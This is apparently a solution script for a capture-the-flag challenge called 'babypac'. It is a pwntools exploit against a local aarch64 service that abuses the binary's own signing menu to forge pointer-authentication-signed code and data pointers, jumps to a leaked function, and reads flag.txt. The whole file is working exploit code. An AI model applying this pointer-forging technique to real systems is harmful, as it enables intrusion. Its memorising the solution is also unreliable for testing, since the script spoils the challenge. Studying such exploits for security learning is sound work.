#!/usr/bin/python3

from pwn import *

elf = ELF('../dist/babypac')

context.arch = 'aarch64'
context.log_level = 'debug'

def get_remote():
    return remote('localhost', 1337)

def forge_code_ptr(ptr: int, diversifier: int) -> int:
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'? ', hex(ptr).encode())
    r.sendlineafter(b'? ', hex(diversifier).encode())

    r.recvuntil(b'pointer: ')
    return int(r.recvline(), 16)

def forge_data_ptr(diversifier: int) -> int:
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'? ', hex(diversifier).encode())
    
    r.recvuntil(b'pointer: ')
    return int(r.recvline(), 16)

def execute(fptr: int, arg_ptr: int):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'? ', hex(fptr).encode())
    r.sendlineafter(b'? ', hex(arg_ptr).encode())
    r.interactive()

if __name__ == '__main__':
    r = get_remote()

    win_offset = elf.sym['win']

    r.recvuntil(b'present: ')
    leak = int(r.recvline().strip(), 16)
    log.success(f'{leak=:#x}')

    r.sendlineafter(b'data: ', b'cat flag.txt')

    execute(forge_code_ptr(leak, 0), forge_data_ptr(leak - win_offset + elf.sym['main']))
